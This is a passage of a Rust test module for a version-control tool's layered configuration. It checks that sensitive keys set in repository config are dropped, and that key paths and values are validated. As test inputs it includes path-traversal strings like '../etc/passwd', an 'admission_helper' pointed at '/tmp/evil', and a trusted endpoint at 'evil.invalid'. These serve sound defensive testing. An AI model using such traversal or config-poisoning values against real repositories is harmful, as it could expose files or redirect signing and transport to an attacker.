                "trusted_remote_endpoint" => cfg.trusted_remote_endpoint.as_str(),
                "admission_helper" => cfg.admission_helper.as_str(),
                "signer" => cfg.signer.as_str(),
                "transport_auth" => cfg.transport_auth.as_str(),
                "pull.require_signed" => cfg.pull_require_signed.as_str(),
                "key.backend" => cfg.key.backend.as_str(),
                "key.default_ref" => cfg.key.default_ref.as_str(),
                "key.ed25519_ref" => cfg.key.ed25519_ref.as_str(),
                "key.secp256k1_ref" => cfg.key.secp256k1_ref.as_str(),
                "key.p256_ref" => cfg.key.p256_ref.as_str(),
                "signing_key" => cfg.signing_key.as_str(),
                "ssh.strict_host_key_checking" => cfg.ssh_strict_host_key_checking.as_str(),
                "ssh.user_known_hosts_file" => cfg.ssh_user_known_hosts_file.as_str(),
                "ssh.identity_file" => cfg.ssh_identity_file.as_str(),
                "http.sslcainfo" => cfg.http_ssl_ca_info.as_str(),
                "attest.signer" => cfg.attest.signer.as_str(),
                "attest.default_algorithm" => cfg.attest.default_algorithm.as_str(),
                "attest.external_signer_path" => cfg.attest.external_signer_path.as_str(),
                "attest.external_signer_args" => {
                    // pipe-list field; empty Vec stringifies to "".
                    if cfg.attest.external_signer_args.is_empty() {
                        ""
                    } else {
                        "<non-empty>"
                    }
                }
                "attest.external_signer_timeout_secs" => {
                    // Option<u64>; None when dropped from repo scope. The
                    // SENTINEL string is non-numeric, so even on the
                    // user path it would parse to None — assert the repo
                    // path leaves it None.
                    if cfg.attest.external_signer_timeout_secs.is_none() {
                        ""
                    } else {
                        "<set>"
                    }
                }
                "attest.secp256k1_key_path" => cfg.attest.secp256k1_key_path.as_str(),
                "attest.p256_key_path" => cfg.attest.p256_key_path.as_str(),
                "grant.webauthn_rp" => {
                    if cfg.grant_webauthn_rp.is_empty() {
                        ""
                    } else {
                        "<non-empty>"
                    }
                }
                // If a new key appears in `REPO_FORBIDDEN_KEYS` without
                // an arm here, fail loudly — the developer must extend
                // both the constant AND the meta-test together. Without
                // this branch, an added key would be silently treated
                // as "not in this struct" and the test would pass.
                other => panic!(
                    "REPO_FORBIDDEN_KEYS contains `{other}` but the meta-test \
                     in config.rs has no matching field accessor. Add an arm \
                     to `every_forbidden_key_is_actually_dropped_from_repo_scope` \
                     so the per-key drop is verified.",
                ),
            };
            // `Config::with_defaults()` pre-seeds a few fields (e.g.
            // `signing_key = ".kit/keys/default.key"`, `signer =
            // "file"`). Merge order is "defaults → user → repo
            // (filtered)", so a dropped repo line cannot OVERWRITE the
            // default. The crisp invariant is: the attacker's
            // SENTINEL must NEVER appear in the observed value.
            assert!(
                observed != SENTINEL,
                "forbidden key `{key}` was NOT dropped from repo scope — \
                 observed `{observed}` (matches attacker SENTINEL)",
            );
        }
    }

    #[test]
    fn user_signing_key_is_honored() {
        let cfg = layer(None, Some("signing_key = /home/user/.kit/global.key\n"));
        assert_eq!(cfg.signing_key, "/home/user/.kit/global.key");
    }

    #[test]
    fn repo_safe_keys_override_user() {
        // `default_branch` is repo-scoped — a project's main is a
        // per-repo decision, not a per-user one. So if both layers set
        // it, the repo wins (it's applied second).
        let cfg = layer(
            Some("default_branch = release\n"),
            Some("default_branch = trunk\n"),
        );
        assert_eq!(cfg.default_branch, "release");
    }

    #[test]
    fn validate_key_path_rejects_parent_dir() {
        assert!(validate_key_path("../etc/passwd").is_err());
        assert!(validate_key_path(".kit/keys/../../etc/passwd").is_err());
        assert!(validate_key_path("foo/../bar").is_err());
    }

    #[test]
    fn validate_key_path_accepts_relative_and_absolute() {
        assert!(validate_key_path("").is_ok());
        assert!(validate_key_path(".kit/keys/default.key").is_ok());
        assert!(validate_key_path("/home/user/.kit/global.key").is_ok());
    }

    #[test]
    fn resolve_key_path_resolves_against_common_dir_in_linked_worktree() {
        // A linked tree signs with the ONE shared repo
        // key store, not a phantom keys dir under its own root.
        let layout = RepoLayout::linked("/trees/wt1", "/main/.kit/worktrees/wt1", "/main/.kit");
        let out = resolve_key_path(
            &layout,
            &home_env(Path::new("/home/u")),
            ".kit/keys/default.key",
        )
        .unwrap();
        assert_eq!(out, std::path::Path::new("/main/.kit/keys/default.key"));
    }

    #[test]
    fn resolve_key_path_rejects_relative_path_outside_repo_keys() {
        let td = TempDir::new().unwrap();
        assert!(
            resolve_key_path(
                &RepoLayout::single(td.path()),
                &home_env(td.path()),
                ".kit/custom/global.key"
            )
            .is_err()
        );
    }

    #[test]
    fn resolve_key_path_accepts_relative_path_under_repo_keys() {
        let td = TempDir::new().unwrap();
        let out = resolve_key_path(
            &RepoLayout::single(td.path()),
            &home_env(td.path()),
            ".kit/keys/custom/global.key",
        )
        .unwrap();
        assert_eq!(out, td.path().join(".kit/keys/custom/global.key"));
    }

    #[test]
    fn expand_user_identity_ed25519() {
        let hex = "11".repeat(32);
        let out = expand_user_identity(&format!("ed25519:{hex}")).unwrap();
        assert_eq!(out.len(), 70);
        assert!(out.starts_with("012000"));
    }

    #[test]
    fn expand_user_identity_mid() {
        let out = expand_user_identity("mid:42").unwrap();
        assert_eq!(out, "0308002a00000000000000");
    }

    #[test]
    fn expand_rejects_bogus() {
        assert!(expand_user_identity("").is_err());
        assert!(expand_user_identity("ed25519:short").is_err());
        assert!(expand_user_identity("mid:notanumber").is_err());
        assert!(expand_user_identity("zzzzzz").is_err());
    }

    #[test]
    fn validate_value_rejects_control_chars() {
        assert!(validate_value("hello world").is_ok());
        assert!(validate_value("bad\x01char").is_err());
        assert!(validate_value("\x7fdel").is_err());
    }

    #[test]
    fn attest_config_defaults_are_empty() {
        let cfg = Config::with_defaults();
        assert_eq!(cfg.signer, DEFAULT_SIGNER);
        assert_eq!(cfg.key.backend_or_fallback(), DEFAULT_KEY_BACKEND);
        assert_eq!(cfg.key.default_ref_or_fallback(), DEFAULT_KEY_REF);
        assert!(cfg.key.default_ref.is_empty());
        assert!(cfg.key.ed25519_ref.is_empty());
        assert!(cfg.key.secp256k1_ref.is_empty());
        assert!(cfg.key.p256_ref.is_empty());
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), DEFAULT_KEY_REF);
        assert_eq!(
            cfg.key.secp256k1_ref_or_fallback(),
            DEFAULT_SECP256K1_KEY_REF
        );
        assert_eq!(cfg.key.p256_ref_or_fallback(), DEFAULT_P256_KEY_REF);
        assert_eq!(cfg.attest.default_algorithm, "");
        assert_eq!(cfg.attest.signer, "");
        assert_eq!(cfg.attest.default_algorithm_or_fallback(), "ed25519");
        assert_eq!(cfg.attest.signer_or_fallback(), "repo-key");
        assert_eq!(
            cfg.attest.secp256k1_key_path_or_default(),
            ".kit/keys/secp256k1.key"
        );
        assert_eq!(cfg.attest.p256_key_path_or_default(), ".kit/keys/p256.key");
    }

    #[test]
    fn removed_keys_are_unknown_keys() {
        for line in [
            "project_id = xyz",
            "author_mid = 5",
            "network = x",
            "a_url = b",
        ] {
            assert!(
                matches!(
                    try_layer(Some(&format!("{line}\n")), None),
                    Err(ConfigError::Rejected { .. })
                ),
                "{line}"
            );
        }
    }

    fn rejection(repo_text: Option<&str>, user_text: Option<&str>) -> String {
        match try_layer(repo_text, user_text) {
            Err(ConfigError::Rejected { location, reason }) => format!("{location}: {reason}"),
            other => panic!("expected a rejected config, got {other:?}"),
        }
    }

    #[test]
    fn unknown_key_is_an_error_with_its_line() {
        let msg = rejection(Some("default_branch = main\nbogus.key = 1\n"), None);
        assert!(msg.contains("repo_config:2"), "{msg}");
        assert!(msg.contains("unknown config key `bogus.key`"), "{msg}");
        // The same holds for the user scope.
        assert!(rejection(None, Some("bogus.key = 1\n")).contains("unknown config key"));
    }

    #[test]
    fn line_without_equals_is_an_error() {
        let msg = rejection(Some("# comment\n\npull.require_signed\n"), None);
        assert!(msg.contains("repo_config:3"), "{msg}");
        assert!(msg.contains("expected `key = value`"), "{msg}");
        assert!(rejection(None, Some("[core]\n")).contains("expected `key = value`"));
    }

    #[test]
    fn malformed_values_are_errors() {
        for line in [
            "durability.objects = sometimes",
            "transport_auth = bearer-ish",
            "signer = maybe",
            "attest.signer = remote",
            "attest.default_algorithm = rsa",
            "ssh.strict_host_key_checking = ask-me",
            "attest.external_signer_timeout_secs = soon",
            "attest.external_signer_timeout_secs = -1",
            "pull.require_signed = disabled",
            "default_branch = a\u{1}b",
        ] {
            assert!(
                matches!(
                    try_layer(None, Some(&format!("{line}\n"))),
                    Err(ConfigError::Rejected { .. })
                ),
                "{line:?} must be rejected"
            );
        }
        for line in [
            "durability.objects = per-object",
            "transport_auth = ENVELOPE",
            "signer = keystore",
            "attest.signer = external",
            "attest.default_algorithm = p256",
            "ssh.strict_host_key_checking = accept-new",
            "attest.external_signer_timeout_secs = 30",
            "attest.external_signer_timeout_secs =",
            "pull.require_signed = false",
        ] {
            assert!(
                try_layer(None, Some(&format!("{line}\n"))).is_ok(),
                "{line}"
            );
        }
    }

    #[test]
    fn core_keys_are_unknown() {
        assert!(rejection(Some("core.editor = vim\n"), None).contains("unknown config key"));
        assert!(rejection(Some("core.autocrlf = true\n"), None).contains("unknown config key"));
    }

    #[test]
    fn invalid_remote_names_and_fields_are_errors() {
        assert!(rejection(Some("remote..url = x\n"), None).contains("invalid name"));
        assert!(rejection(Some("remote.a b.url = x\n"), None).contains("invalid name"));
        assert!(rejection(Some("remote.origin.bogus = x\n"), None).contains("unknown config key"));
        assert!(rejection(Some("branch.main.bogus = x\n"), None).contains("unknown config key"));
    }

    #[test]
    fn forbidden_repo_key_with_a_bad_value_is_still_only_dropped() {
        // The forbidden-key rule runs first: the repo layer never parses
        // the value of a key it will not honor.
        let cfg = layer(Some("pull.require_signed = nope\n"), None);
        assert!(cfg.pull_require_signed.is_empty());
    }

    #[test]
    fn oversized_config_file_is_an_error() {
        let td = TempDir::new().unwrap();
        let path = td.path().join("repo_config");
        let mut text = String::from("default_branch = main\n");
        text.push_str(&"#".repeat(usize::try_from(MAX_CONFIG_BYTES).unwrap()));
        fs::write(&path, text).unwrap();
        let mut cfg = Config::with_defaults();
        assert!(matches!(
            apply_file(&mut cfg, &path, ConfigScope::Repo, &NoopObserver),
            Err(ConfigError::TooLarge(_))
        ));
    }

    #[test]
    fn named_remote_keys_parse_repo_safe() {
        let cfg = layer(
            Some(
                "remote.origin.url = kit+file:///srv/m\n\
                 remote.origin.type = file\n\
                 branch.main.remote = origin\n\
                 branch.main.merge = main\n",
            ),
            None,
        );
        let origin = cfg.remotes.get("origin").expect("origin present");
        assert_eq!(origin.url, "kit+file:///srv/m");
        assert_eq!(origin.remote_type, "file");
        let up = cfg.branch_upstreams.get("main").expect("upstream present");
        assert_eq!(up.remote, "origin");
        assert_eq!(up.branch, "main");
    }

    #[test]
    fn named_remote_roundtrips_through_write() {
        let td = TempDir::new().unwrap();
        let mut cfg = Config::with_defaults();
        cfg.remotes.insert(
            "origin".into(),
            RemoteEntry {
                url: "kit+https://h/r".into(),
                remote_type: "http".into(),
            },
        );
        cfg.branch_upstreams.insert(
            "main".into(),
            Upstream {
                remote: "origin".into(),
                branch: "main".into(),
            },
        );
        write(&RepoLayout::single(td.path()), &cfg).unwrap();
        let home = TempDir::new().unwrap();
        let reloaded = read_or_default(
            &RepoLayout::single(td.path()),
            &home_env(home.path()),
            &NoopObserver,
        )
        .unwrap();
        assert_eq!(
            reloaded.remotes.get("origin").unwrap().url,
            "kit+https://h/r"
        );
        assert_eq!(
            reloaded.branch_upstreams.get("main").unwrap().remote,
            "origin"
        );
    }

    #[test]
    fn resolve_remote_default_and_named_provenance() {
        // Named remote in the repo layer is repo_chosen.
        let lc = layered(
            Some("remote.origin.url = kit+https://h/r\nremote.origin.type = http\n"),
            None,
        );
        let r = resolve_remote(&lc, "origin").expect("origin resolves");
        assert_eq!(r.endpoint, "kit+https://h/r");
        assert!(r.repo_chosen);

        // Flat default endpoint in the repo layer is repo_chosen.
        let lc = layered(Some("remote_endpoint = kit+https://h/d\n"), None);
        let r = resolve_remote(&lc, "default").expect("default resolves");
        assert!(r.repo_chosen);

        // User-layer flat endpoint is NOT repo_chosen.
        let lc = layered(None, Some("remote_endpoint = kit+https://h/u\n"));
        let r = resolve_remote(&lc, "").expect("empty -> default");
        assert!(!r.repo_chosen);

        // Unknown name resolves to None.
        let lc = layered(None, None);
        assert!(resolve_remote(&lc, "nope").is_none());
    }

    #[test]
    fn resolve_upstream_explicit_and_fallback() {
        let lc = layered(
            Some("branch.main.remote = origin\nbranch.main.merge = trunk\n"),
            None,
        );
        let up = resolve_upstream(&lc, "main").unwrap();
        assert_eq!(up.remote, "origin");
        assert_eq!(up.branch, "trunk");

        // Fallback to default remote tracking same-named branch.
        let lc = layered(Some("remote_endpoint = kit+file:///srv\n"), None);
        let up = resolve_upstream(&lc, "feature").unwrap();
        assert_eq!(up.remote, DEFAULT_REMOTE_NAME);
        assert_eq!(up.branch, "feature");

        // No upstream + no default remote → None.
        let lc = layered(None, None);
        assert!(resolve_upstream(&lc, "main").is_none());
    }

    #[test]
    fn admission_keys_are_user_only_and_do_not_create_remote() {
        let repo = "admission_helper = /tmp/evil\nremote.origin.admission_headers = X-Evil\n";
        let cfg = layer(Some(repo), None);
        assert!(cfg.admission_helper.is_empty());
        assert!(cfg.remote_admission_headers.is_empty());
        assert!(cfg.remotes.is_empty());
        assert!(is_repo_forbidden_key("admission_helper"));
        assert!(is_repo_forbidden_key("remote.origin.admission_headers"));
        assert!(is_repo_forbidden_key("remote.a.b.admission_headers"));
        let cfg = layer(
            None,
            Some(
                "admission_helper = /usr/bin/helper\nremote.origin.admission_headers = X-Admission\n",
            ),
        );
        assert_eq!(cfg.admission_helper, "/usr/bin/helper");
        assert_eq!(cfg.remote_admission_headers["origin"], "X-Admission");
        assert!(cfg.remotes.is_empty());
    }

    #[test]
    fn user_config_path_follows_the_environment() {
        let env = Environment {
            home: Some("/home/u".into()),
            ..Environment::new("/work")
        };
        assert_eq!(
            user_config_path(&env).unwrap(),
            Path::new("/home/u/.config/kit/config")
        );
        let env = Environment {
            xdg_config_home: Some("/xdg".into()),
            ..env
        };
        assert_eq!(
            user_config_path(&env).unwrap(),
            Path::new("/xdg/kit/config")
        );
    }

    #[test]
    fn missing_or_relative_config_home_fails_closed() {
        let layout = RepoLayout::single("/work");
        for env in [
            Environment::new("/work"),
            Environment {
                home: Some("rel".into()),
                ..Environment::new("/work")
            },
            Environment {
                xdg_config_home: Some("rel".into()),
                home: Some("/h".into()),
                ..Environment::new("/work")
            },
        ] {
            assert!(matches!(
                user_config_path(&env),
                Err(ConfigError::NoConfigHome(_))
            ));
            assert!(matches!(
                read_or_default(&layout, &env, &NoopObserver),
                Err(ConfigError::NoConfigHome(_))
            ));
            assert!(matches!(
                read_layered(&layout, &env, &NoopObserver),
                Err(ConfigError::NoConfigHome(_))
            ));
            assert!(matches!(
                write_user_kv(&env, "default_branch", "trunk"),
                Err(ConfigError::NoConfigHome(_))
            ));
            assert!(matches!(
                remove_user_kv(&env, "default_branch"),
                Err(ConfigError::NoConfigHome(_))
            ));
        }
    }

    #[test]
    fn user_file_under_the_environment_home_is_read() {
        let home = TempDir::new().unwrap();
        let repo = TempDir::new().unwrap();
        let env = home_env(home.path());
        write_user_kv(&env, "signing_key", "/k").unwrap();
        write_user_kv(&env, "default_branch", "trunk").unwrap();
        let layered = read_layered(&RepoLayout::single(repo.path()), &env, &NoopObserver).unwrap();
        assert_eq!(layered.user.signing_key, "/k");
        assert_eq!(layered.merged.default_branch, "trunk");
        assert!(layered.repo.signing_key.is_empty());
    }

    #[test]
    fn user_kv_replaces_appends_and_removes() {
        let home = TempDir::new().unwrap();
        let env = home_env(home.path());
        let path = user_config_path(&env).unwrap();
        write_user_kv(&env, "default_branch", "a").unwrap();
        write_user_kv(&env, "Default_Branch", "b").unwrap();
        write_user_kv(&env, "signing_key", "/s").unwrap();
        assert_eq!(
            fs::read_to_string(&path).unwrap(),
            "default_branch = b\nsigning_key = /s\n"
        );
        assert!(remove_user_kv(&env, "signing_key").unwrap());
        assert!(!remove_user_kv(&env, "signing_key").unwrap());
        assert_eq!(fs::read_to_string(&path).unwrap(), "default_branch = b\n");
    }

    #[test]
    fn xdg_config_home_wins_over_home() {
        let home = TempDir::new().unwrap();
        let xdg = TempDir::new().unwrap();
        let repo = TempDir::new().unwrap();
        let env = Environment {
            xdg_config_home: Some(xdg.path().to_path_buf()),
            ..home_env(home.path())
        };
        write_user_kv(&env, "default_branch", "trunk").unwrap();
        assert!(xdg.path().join("kit/config").is_file());
        assert!(!home.path().join(".config").exists());
        let cfg = read_or_default(&RepoLayout::single(repo.path()), &env, &NoopObserver).unwrap();
        assert_eq!(cfg.default_branch, "trunk");
    }

    #[test]
    fn overrides_win_over_files_and_are_not_layered() {
        let home = TempDir::new().unwrap();
        let repo = TempDir::new().unwrap();
        let env = Environment {
            config_overrides: vec![("Default_Branch".to_owned(), " dev ".to_owned())],
            ..home_env(home.path())
        };
        write_user_kv(&env, "default_branch", "trunk").unwrap();
        let layered = read_layered(&RepoLayout::single(repo.path()), &env, &NoopObserver).unwrap();
        assert_eq!(layered.merged.default_branch, "dev");
        assert_eq!(layered.user.default_branch, "trunk");
        assert!(layered.repo.default_branch.is_empty());
    }

    #[test]
    fn forbidden_override_is_dropped_and_reported() {
        let home = TempDir::new().unwrap();
        let repo = TempDir::new().unwrap();
        let env = Environment {
            config_overrides: vec![("user.identity".to_owned(), "ff".to_owned())],
            ..home_env(home.path())
        };
        let recorder = Recorder::default();
        let cfg = read_or_default(&RepoLayout::single(repo.path()), &env, &recorder).unwrap();
        assert!(cfg.user_identity.is_empty());
        assert_eq!(
            recorder.events(),
            vec![ConfigEvent::IgnoredOverride {
                key: "user.identity".to_owned()
            }]
        );
    }

    #[test]
    fn bad_override_is_an_error() {
        let home = TempDir::new().unwrap();
        let repo = TempDir::new().unwrap();
        for (key, value) in [
            ("no.such.key", "x"),
            ("durability.objects", "bogus"),
            ("default_branch", "a\u{1}b"),
        ] {
            let env = Environment {
                config_overrides: vec![(key.to_owned(), value.to_owned())],
                ..home_env(home.path())
            };
            let result = read_layered(&RepoLayout::single(repo.path()), &env, &NoopObserver);
            assert!(matches!(result, Err(ConfigError::Rejected { .. })), "{key}");
        }
    }

    #[test]
    fn forbidden_repo_key_is_dropped_and_reported_once() {
        let home = TempDir::new().unwrap();
        let repo = TempDir::new().unwrap();
        fs::create_dir_all(repo.path().join(".kit")).unwrap();
        fs::write(
            repo.path().join(".kit/config"),
            "trusted_remote_endpoint = kit+https://evil.invalid/r\n",
        )
        .unwrap();
        let recorder = Recorder::default();
        let layered = read_layered(
            &RepoLayout::single(repo.path()),
            &home_env(home.path()),
            &recorder,
        )
        .unwrap();
        assert!(layered.merged.trusted_remote_endpoint.is_empty());
        assert!(layered.repo.trusted_remote_endpoint.is_empty());
        assert_eq!(
            recorder.events(),
            vec![ConfigEvent::IgnoredRepoKey {
                key: "trusted_remote_endpoint".to_owned(),
                origin: repo.path().join(".kit/config"),
            }]
        );
    }

    #[test]
    fn absolute_key_path_must_stay_under_the_environment_home() {
        let td = TempDir::new().unwrap();
        let layout = RepoLayout::single(td.path());
        let env = home_env(Path::new("/home/u"));
        assert_eq!(
            resolve_key_path(&layout, &env, "/home/u/.kit/k.key").unwrap(),
            Path::new("/home/u/.kit/k.key")
        );
        assert!(resolve_key_path(&layout, &env, "/home/other/k.key").is_err());
        assert!(resolve_key_path(&layout, &env, "/home/u/../other/k.key").is_err());
    }

    #[test]
    fn absolute_key_path_fails_closed_without_a_usable_home() {
        let td = TempDir::new().unwrap();
        let layout = RepoLayout::single(td.path());
        for home in [None, Some(""), Some("/"), Some("rel"), Some("./h")] {
            let env = Environment {
                home: home.map(PathBuf::from),
                ..Environment::new("/work")
            };
            assert!(
                resolve_key_path(&layout, &env, "/tmp/k.key").is_err(),
                "{home:?}"
            );
        }
    }

    #[test]
    fn ssl_ca_tilde_path_uses_the_environment_home() {
        let layout = RepoLayout::single("/work");
        let cfg = Config {
            http_ssl_ca_info: "~/ca.pem".to_owned(),
            ..Config::default()
        };
        let env = home_env(Path::new("/home/u"));
        assert_eq!(
            cfg.ssl_ca_file_path(&layout, &env).unwrap(),
            Some(PathBuf::from("/home/u/ca.pem"))
        );
        assert!(matches!(
            cfg.ssl_ca_file_path(&layout, &Environment::new("/work")),
            Err(ConfigError::InvalidHttpCaPath(_))
        ));
    }
}
